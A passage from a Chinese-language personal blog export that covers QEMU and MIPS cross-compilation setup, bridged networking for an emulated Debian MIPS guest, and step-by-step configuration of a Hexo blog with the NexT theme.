<h2 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>qemu github 项目地址：<a href="https://github.com/qemu/qemu">https://github.com/qemu/qemu</a></p>
<p>qemu 官网：<a href="https://www.qemu.org/">https://www.qemu.org/</a></p>
<p>参考网站提供的安装方式，目前直接使用 <code>apt</code> 安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install qemu</span><br><span class="line">Suggested packages:</span><br><span class="line">  qemu-user-static samba vde2 qemu-efi openbios-ppc openhackware</span><br><span class="line">  openbios-sparc sgabios ovmf debootstrap sharutils-doc bsd-mailx | mailx</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  binfmt-support cpu-checker ibverbs-providers ipxe-qemu</span><br><span class="line">  ipxe-qemu-256k-compat-efi-roms libaio1 libcacard0 libfdt1 libibverbs1</span><br><span class="line">  libiscsi7 libnl-route-3-200 librados2 librbd1 librdmacm1 libsdl1.2debian</span><br><span class="line">  libspice-server1 libusbredirparser1 libxen-4.9 libxenstore3.0 msr-tools qemu</span><br><span class="line">  qemu-block-extra qemu-slof qemu-system qemu-system-arm qemu-system-common</span><br><span class="line">  qemu-system-mips qemu-system-misc qemu-system-ppc qemu-system-s390x</span><br><span class="line">  qemu-system-sparc qemu-system-x86 qemu-user qemu-user-binfmt qemu-utils</span><br><span class="line">  seabios sharutils</span><br><span class="line"><span class="comment"># 可以看到 qemu-utils qemu-user qemu-system 都自动安装成功</span></span><br><span class="line">$ qemu-</span><br><span class="line">qemu-aarch64              qemu-ppc                  qemu-system-mipsel</span><br><span class="line">qemu-alpha                qemu-ppc64                qemu-system-moxie</span><br><span class="line">qemu-arm                  qemu-ppc64abi32           qemu-system-nios2</span><br><span class="line">qemu-armeb                qemu-ppc64le              qemu-system-or1k</span><br><span class="line">qemu-cris                 qemu-s390x                qemu-system-ppc</span><br><span class="line">qemu-hppa                 qemu-sh4                  qemu-system-ppc64</span><br><span class="line">qemu-i386                 qemu-sh4eb                qemu-system-ppc64le</span><br><span class="line">qemu-img                  qemu-sparc                qemu-system-ppcemb</span><br><span class="line">qemu-io                   qemu-sparc32plus          qemu-system-s390x</span><br><span class="line">qemu-m68k                 qemu-sparc64              qemu-system-sh4</span><br><span class="line">qemu-make-debian-root     qemu-system-aarch64       qemu-system-sh4eb</span><br><span class="line">qemu-microblaze           qemu-system-alpha         qemu-system-sparc</span><br><span class="line">qemu-microblazeel         qemu-system-arm           qemu-system-sparc64</span><br><span class="line">qemu-mips                 qemu-system-cris          qemu-system-tricore</span><br><span class="line">qemu-mips64               qemu-system-i386          qemu-system-unicore32</span><br><span class="line">qemu-mips64el             qemu-system-lm32          qemu-system-x86_64</span><br><span class="line">qemu-mipsel               qemu-system-m68k          qemu-system-xtensa</span><br><span class="line">qemu-mipsn32              qemu-system-microblaze    qemu-system-xtensaeb</span><br><span class="line">qemu-mipsn32el            qemu-system-microblazeel  qemu-tilegx</span><br><span class="line">qemu-nbd                  qemu-system-mips          qemu-x86_64</span><br><span class="line">qemu-nios2                qemu-system-mips64        </span><br><span class="line">qemu-or1k                 qemu-system-mips64el </span><br><span class="line"></span><br><span class="line"><span class="comment"># 依据建议的安装包手动安装</span></span><br><span class="line">$ sudo apt install qemu-user-static</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>交叉编译这个名字其实有时候很费解，还不如直接<strong>跨架构编译</strong>，即能够在一个体系架构下编译另一个体系架构的程序<br>🌰 在 X86_64 Ubuntu 虚拟机下能够编译 MIPS 程序</p>
<p>🧐 安装似乎可以分成 <strong>手动 buildroot 源码编译</strong> 和 <strong>自动 apt 安装</strong><br><strong>自动安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以 MIPS 小端序 架构为例 自动安装</span></span><br><span class="line">$ sudo apt install gcc-mipsel-linux-gnu </span><br><span class="line">$ sudo apt install gcc-multilib-mipsel-linux-gnu</span><br><span class="line">$ mipsel-linux-gnu-</span><br><span class="line">mipsel-linux-gnu-addr2line     mipsel-linux-gnu-gcov-7</span><br><span class="line">mipsel-linux-gnu-ar            mipsel-linux-gnu-gcov-dump</span><br><span class="line">mipsel-linux-gnu-as            mipsel-linux-gnu-gcov-dump-7</span><br><span class="line">mipsel-linux-gnu-c++filt       mipsel-linux-gnu-gcov-tool</span><br><span class="line">mipsel-linux-gnu-cpp           mipsel-linux-gnu-gcov-tool-7</span><br><span class="line">mipsel-linux-gnu-cpp-7         mipsel-linux-gnu-gprof</span><br><span class="line">mipsel-linux-gnu-dwp           mipsel-linux-gnu-ld</span><br><span class="line">mipsel-linux-gnu-elfedit       mipsel-linux-gnu-ld.bfd</span><br><span class="line">mipsel-linux-gnu-gcc           mipsel-linux-gnu-ld.gold</span><br><span class="line">mipsel-linux-gnu-gcc-7         mipsel-linux-gnu-nm</span><br><span class="line">mipsel-linux-gnu-gcc-ar        mipsel-linux-gnu-objcopy</span><br><span class="line">mipsel-linux-gnu-gcc-ar-7      mipsel-linux-gnu-objdump</span><br><span class="line">mipsel-linux-gnu-gcc-nm        mipsel-linux-gnu-ranlib</span><br><span class="line">mipsel-linux-gnu-gcc-nm-7      mipsel-linux-gnu-readelf</span><br><span class="line">mipsel-linux-gnu-gcc-ranlib    mipsel-linux-gnu-size</span><br><span class="line">mipsel-linux-gnu-gcc-ranlib-7  mipsel-linux-gnu-strings</span><br><span class="line">mipsel-linux-gnu-gcov          mipsel-linux-gnu-strip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有的库都安装好</span></span><br><span class="line">$ <span class="built_in">ls</span> /usr/mipsel-linux-gnu/</span><br><span class="line">bin  include  lib  lib32  lib64</span><br></pre></td></tr></table></figure>

<h3 id="出现的问题-1"><a href="#出现的问题-1" class="headerlink" title="出现的问题"></a>出现的问题</h3><p><strong>自动安装</strong><br>在运行动态编译程序时，会出现无法找到运行库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hellomips2</span><br><span class="line">hellomips2: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=102923f6f07c0954cdcec2091a8e65988d646527, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel-static hellomips2</span><br><span class="line">/lib/ld.so.1: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测是动态编译的程序默认去 /lib 下进行寻找动态链接库</span></span><br><span class="line"><span class="comment"># 两种解决办法</span></span><br><span class="line"><span class="comment"># 1. 将动态链接库直接复制到 /lib 下，执行命令行执行模拟，【感觉环境会被搞乱</span></span><br><span class="line">embeded@ubuntu:/usr/mipsel-linux-gnu/lib$ sudo <span class="built_in">cp</span> ld.so.1 /lib</span><br><span class="line">embeded@ubuntu:/usr/mipsel-linux-gnu/lib$ <span class="built_in">ls</span> /lib</span><br><span class="line">apparmor       hdparm                                lsb            terminfo</span><br><span class="line">brltty         ifupdown                              modprobe.d     udev</span><br><span class="line">console-setup  init                                  modules        ufw</span><br><span class="line">cpp            klibc-IYXwqr0atR70aQDgNUuRThfwUwA.so  netplan        x86_64-linux-gnu</span><br><span class="line">crda           ld.so.1                               recovery-mode</span><br><span class="line">firmware       linux-sound-base                      systemd</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel-static hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 将动态库和静态编译模拟程序qemu-mipsel-static复制到需要模拟的程序所在目录下，执行模拟 【感觉比第一种选择好</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">cp</span> -r /usr/mipsel-linux-gnu/lib .</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) .</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ sudo <span class="built_in">chroot</span> . ./qemu-mipsel-static hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 在模拟时添加路径 【感觉最简单</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel -L <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span> hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br></pre></td></tr></table></figure>

<p><strong>神奇的未理解的现象</strong><br>在理论来说，不同架构的程序是不能运行的，但是在静态编译后却能够运行，有点费解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 尝试程序为 家用路由器漏洞 一书第二章 hello 和 静态交叉编译的 hellomips</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hello</span><br><span class="line">hello: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hellomips</span><br><span class="line">hellomips: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a0c1b5ffe47a77b693643e4637baa72d4496a962, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">uname</span> -a </span><br><span class="line">Linux ubuntu 5.4.0-84-generic <span class="comment">#94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hello <span class="string">&quot;Why can run&quot;</span></span><br><span class="line">Why can run</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hellomips <span class="string">&quot;Why can run&quot;</span></span><br><span class="line">Why can run</span><br></pre></td></tr></table></figure>

<h1 id="软件环境配置流程"><a href="#软件环境配置流程" class="headerlink" title="软件环境配置流程"></a>软件环境配置流程</h1><h2 id="MIPS-系统网络配置"><a href="#MIPS-系统网络配置" class="headerlink" title="MIPS 系统网络配置"></a>MIPS 系统网络配置</h2><p><strong>安装工具库</strong></p>
<p>安装 User mode Linux 工具,User Mode Linux 能够以用户态启动 Linux 内核，提供了一种虚拟机，将 Linux 作为用户进程运行在另一个 Linux 内核下。 这对于内核开发、沙盒、监禁、实验和许多其他事情很有用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo apt install uml-utilities</span><br><span class="line">embeded@ubuntu:~$ uml_</span><br><span class="line">uml_mconsole  uml_moo       uml_switch    </span><br><span class="line">uml_mkcow     uml_mount     uml_watchdog</span><br></pre></td></tr></table></figure>
<p>安装 Linux 网桥工具,能够创建和管理网桥设备，可为VM设置网络</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo apt install bridge-utils</span><br></pre></td></tr></table></figure>
<p><strong>配置主机网络</strong><br>要构建模拟系统的网络配置，需要在主机网络配置网络接口，查看系统网络配置 可以看到两个网络接口为 ens33 和 lo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line">        inet6 fe80::ae68:bfd8:87e6:7a5e  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:83:f8:e7  txqueuelen 1000  (Ethernet)</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>修改主机网络配置 将 ens33 作为桥接端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo nano /etc/network/interfaces</span><br><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33      </span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># auto br0</span></span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports ens33</span><br><span class="line">  bridge_maxwait 0</span><br></pre></td></tr></table></figure>

<!-- **修改 QEMU 网络接口脚本**
由于 ``qemu-ifup`` 文件早已存在，直接在脚本后面添加，能够支持 QEMU 在启动时处理网络
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo nano /etc/qemu-ifup</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Executing /etc/qemu-ifup&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Bridge up <span class="variable">$1</span> for bridged mode...&quot;</span></span><br><span class="line">sudo /sbin/ifconfig <span class="variable">$1</span> 0.0.0.0 promisc up</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Adding <span class="variable">$1</span> to br0...&quot;</span></span><br><span class="line">sudo /sbin/brct1 addif br0 <span class="variable">$1</span></span><br><span class="line"><span class="built_in">sleep</span> 2</span><br><span class="line">``` --&gt;</span><br><span class="line"></span><br><span class="line">**重启网络**</span><br><span class="line">为了使配置生效，需要将网络进行重启</span><br><span class="line">```bash</span><br><span class="line">embeded@ubuntu:~$ sudo /etc/init.d/networking restart</span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br></pre></td></tr></table></figure>

<p><strong>启用桥接网络</strong><br>先关闭 ens33 端口，查看网络接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo ifdown ens33</span><br><span class="line">...</span><br><span class="line">DHCPRELEASE on ens33 to 192.168.31.1 port 67 (xid=0x297aad1a)</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>开启 br0 桥接端口，重新查看网络接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo ifup br0</span><br><span class="line">...</span><br><span class="line">DHCPDISCOVER on br0 to 255.255.255.255 port 67 interval 3 (xid=0x6dfa5573)</span><br><span class="line">DHCPREQUEST of 192.168.31.111 on br0 to 255.255.255.255 port 67 (xid=0x7355fa6d)</span><br><span class="line">DHCPOFFER of 192.168.31.111 from 192.168.31.1</span><br><span class="line">DHCPACK of 192.168.31.111 from 192.168.31.1</span><br><span class="line">bound to 192.168.31.111 -- renewal <span class="keyword">in</span> 16622 seconds.</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">br0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line"></span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br></pre></td></tr></table></figure>

<p><strong>修改MIPS系统网络</strong><br>以 MIPS 大端系统为例，虚拟机文件地址: <a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a> 选用 <code>vmlinux-2.6.32-5-4kc-malta</code> 内核文件及 <code>debian_squeeze_mips_standard.qcow2</code> 磁盘镜像</p>
<p>启动 MIPS 虚拟机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 账号密码均为 root</span></span><br><span class="line">debian-mips login: root</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看网络接口</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig -a</span></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改MIPS系统网络配置文件 <code>/etc/network/interfaces</code>, 将 <code>eh0</code> 替换成 <code>eh1</code>，并启动 <code>en1</code> 接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# nano /etc/network/interfaces</span><br><span class="line"># This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5).</span><br><span class="line"></span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line"># The primary network interface</span><br><span class="line">allow-hotplug eth1</span><br><span class="line">iface eth1 inet dhcp</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ifup eth1</span><br><span class="line">...</span><br><span class="line">bound to 192.168.31.170 -- renewal in 21254 seconds.</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ifconfig </span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          inet addr:192.168.31.170  Bcast:192.168.31.255  Mask:255.255.255.0</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ping 192.168.31.111</span><br><span class="line">PING 192.168.31.111 (192.168.31.111) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.31.111: icmp_req=1 ttl=64 time=6.43 ms</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ping www.baidu.com</span><br><span class="line">PING www.a.shifen.com (112.80.248.76) 56(84) bytes of data.</span><br><span class="line">64 bytes from 112.80.248.76: icmp_req=1 ttl=47 time=38.3 ms</span><br></pre></td></tr></table></figure>
<p>此时 MIPS 系统的网络算是配置完成，接下来就能够使用 ssh 对其进行管理</p>
]]></content>
      <categories>
        <category>Iot</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
      </tags>
  </entry>
  <entry>
    <title>个人博客搭建记录[2]</title>
    <url>/2022/05/02/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95-2/</url>
    <content><![CDATA[<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OS Platform: macOS</span><br><span class="line">OS Version: 10.15</span><br></pre></td></tr></table></figure>

<h3 id="个性化配置"><a href="#个性化配置" class="headerlink" title="个性化配置"></a>个性化配置</h3><p><strong>更换主题</strong><br>主题是博客页面的展示方式，不喜欢当前主题可以进行更换</p>
<p>hexo 主题页面：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br>本文采用 <a href="https://github.com/theme-next/hexo-theme-next">Next</a> 主题</p>
<p>下载 thems 到博客文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p>修改站点的配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
<p>打开主题的配置文件进行 Scheme Settings</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br></pre></td></tr></table></figure>
<p>重新编译并部署即可</p>
<p><strong>修改目录</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br></pre></td></tr></table></figure>

<p><strong>更换头像</strong><br>选择自己喜欢的图片加进去即可</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpeg</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>添加社交网络</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/darenfy</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:darenfy@gmail.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br></pre></td></tr></table></figure>
<p><strong>增加阅读全文功能</strong></p>
<p><strong>开启文章目录</strong></p>
<h3 id="Hexo-使用"><a href="#Hexo-使用" class="headerlink" title="Hexo 使用"></a>Hexo 使用</h3><h4 id="如何写文章"><a href="#如何写文章" class="headerlink" title="如何写文章"></a>如何写文章</h4><p>命令行输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&#x27;blog name&#x27;</span></span><br></pre></td></tr></table></figure>
<p>就能看到在 <code>source</code> 文件夹下新建了 <code>blog name.md</code> 文件，</p>
<h4 id="搭建图床"><a href="#搭建图床" class="headerlink" title="搭建图床"></a>搭建图床</h4><p>使用 picGo 在 github 上构建免费图床，具体设置请参考 <a href="https://picgo.github.io/PicGo-Doc/zh/guide/">https://picgo.github.io/PicGo-Doc/zh/guide/</a></p>
<h3 id="Hexo-备份"><a href="#Hexo-备份" class="headerlink" title="Hexo 备份"></a>Hexo 备份</h3><p><a href="http://www.xiaoliblog.cn/page/hexobackup.html#%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6">hexo-git-backup 博客备份及恢复</a><br><a href="https://github.com/coneycode/hexo-git-backup">git-backup</a></p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
<li>在进行个性化配置的过程中，如果想要实时查看配置效果，直接采用本地 <code>hexo s</code></li>
</ol>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.mdnice.com/writing/382af676baff4ed4ad5511074fb736da">https://www.mdnice.com/writing/382af676baff4ed4ad5511074fb736da</a></p>
<p><a href="https://blog.51cto.com/u_12877374/2853898">Hexo博客NexT主题开启文章目录和调整样式</a></p>
<p><a href="http://theme-next.iissnan.com/theme-settings.html">主题配置</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/460818216">hexo博客新增RSS功能支持</a></p>
<p><a href="https://tding.top/archives/42c38b10.html">Hexo-NexT (v7.0+) 主题配置</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>blog搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>个人博客搭建记录[1]</title>
    <url>/2022/05/02/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95-1/</url>
    <content><![CDATA[<span id="more"></span>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OS Type: macOS</span><br><span class="line">OS Version: 10.15</span><br><span class="line">git 2.30.0</span><br><span class="line">node v16.11.0</span><br><span class="line">npm 8.0.0</span><br></pre></td></tr></table></figure>

<h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><p><strong>安装 hexo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line">$ hexo --version</span><br><span class="line">hexo-cli: 4.3.0</span><br><span class="line">os: darwin 19.6.0 10.15.7</span><br><span class="line"></span><br><span class="line">node: 16.11.0</span><br><span class="line">v8: 9.4.146.19-node.13</span><br><span class="line">uv: 1.42.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.9</span><br><span class="line">ares: 1.17.2</span><br><span class="line">modules: 93</span><br><span class="line">nghttp2: 1.45.1</span><br><span class="line">napi: 8</span><br><span class="line">llhttp: 6.0.2</span><br><span class="line">openssl: 1.1.1l</span><br><span class="line">cldr: 39.0</span><br><span class="line">icu: 69.1</span><br><span class="line">tz: 2021a</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></figure>

<p><strong>初始化 hexo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt; </span><br><span class="line">INFO  Cloning hexo-starter https://github.com/hexojs/hexo-starter.git</span><br><span class="line">INFO  Install dependencies</span><br><span class="line">INFO  Start blogging with Hexo!</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── _config.landscape.yml </span><br><span class="line">├── _config.yml <span class="comment"># 网站的配置信息</span></span><br><span class="line">├── node_modules</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json <span class="comment"># 应用程序的信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 模版文件夹 - 新建文章文件中默认添加的内容</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 存放用户资源的地方</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹 - 用来生成静态页面</span></span><br></pre></td></tr></table></figure>

<p><strong>配置远程仓库</strong><br>创建 git 仓库，仓库名为 <name>.github.io</p>
<p>在本地设置 git 配置，并将 ssh 公钥配置到 github</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&#x27;&lt;gitname&gt;&#x27;</span></span><br><span class="line">$ git config --global user.email <span class="string">&#x27;&lt;gitemail&gt;&#x27;</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;&lt;gitemail&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<p>查看 ssh 是否设置成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh git@github.com</span><br><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi Yourname! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="string">Connection to github.com closed.</span></span><br></pre></td></tr></table></figure>

